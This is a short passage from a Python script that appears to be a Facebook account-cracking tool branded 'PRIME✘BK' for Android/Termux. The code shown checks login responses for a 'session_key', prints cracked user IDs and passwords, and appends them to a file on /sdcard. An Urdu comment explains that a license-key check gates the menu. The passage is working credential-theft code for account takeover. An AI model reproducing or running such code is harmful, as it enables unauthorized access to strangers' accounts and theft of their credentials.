                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mPRIME✘BK\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;97m{creationyear(uid)}")
                    open('/sdcard/PRIME X BK-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
                elif 'session_key' in po:
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mPRIME✘BK\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;97m{creationyear(uid)}")
                    open('/sdcard/PRIME X BK-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except Exception as e:
            pass
    loop += 1

if __name__ == '__main__':
# یہاں پہلے کی چیک ہوگی، اگر اپروو ہوگی تو مینو چلے گا، ورنہ اسکرپٹ بند ہو جائے گی
    if check_key():
        BNG_71_()